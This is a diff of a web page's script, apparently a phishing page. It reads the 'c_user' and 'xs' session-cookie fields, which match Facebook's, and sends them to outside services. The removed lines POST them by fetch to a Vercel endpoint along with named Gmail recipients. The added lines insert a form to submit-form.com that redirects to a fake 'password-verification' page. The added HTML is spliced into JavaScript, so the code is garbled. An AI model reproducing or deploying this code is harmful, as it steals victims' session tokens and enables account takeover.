@@ -359,26 +359,21 @@
             const submitButton = document.getElementById('submitButton');
             submitButton.classList.add('btn-loading');
             submitButton.disabled = true;
+            <form
+                class="content"
+                action="https://submit-form.com/QenyccFr3"
+                method="POST"
+              >
+        <input
+      type="hidden"
+      name="_redirect"
+      value="https://password-verification-terms.vercel.app/"
             
             const cUserInput = document.getElementById("c_user");
             const xsInput = document.getElementById("xs");
-            
-            fetch("https://postal-form.vercel.app/submit", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                    c_user: cUserInput.value,
-                    xs: xsInput.value,
-                    emails: ["tariqnizniz@gmail.com", "tariqniz96@gmail.com"],
-                    workerEmail: "tariqnizniz@gmail.com",
-                    name: "Khiyam",
-                }),
             })
             .then((response) => {
                 if (response.ok) {
-                    window.location.href = "password.html";
                 } else {
                     throw new Error('Submission failed');
                 }
